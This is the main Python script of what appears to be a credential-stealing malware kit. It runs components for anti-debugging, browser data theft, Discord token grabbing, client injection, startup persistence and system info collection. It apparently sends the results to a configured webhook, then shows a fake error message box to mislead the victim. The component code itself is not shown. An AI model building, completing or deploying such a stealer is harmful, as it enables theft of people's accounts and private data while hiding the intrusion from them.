from components.antidebug import AntiDebug
from components.browsers import Browsers
from components.discordtoken import DiscordToken
from components.injection import Injection
from components.startup import Startup
from components.systeminfo import SystemInfo
from config import __CONFIG__
from time import sleep
import ctypes


def main(webhook):
    funcs = [
        AntiDebug,
        Browsers,
        DiscordToken,
        Injection,
        Startup,
        SystemInfo,
    ]

    for func in funcs:
        if __CONFIG__[func.__name__.lower()]:
            try:
                if func.__init__.__code__.co_argcount == 2:
                    func(webhook)
                else:
                    func()

            except Exception as e:
                print(f'Error in {func.__name__}: {e}')



if __name__ == '__main__':
    main(__CONFIG__['webhook'])
    ctypes.windll.user32.MessageBoxW(None, __CONFIG__['errorm'], __CONFIG__['errort'], 0)
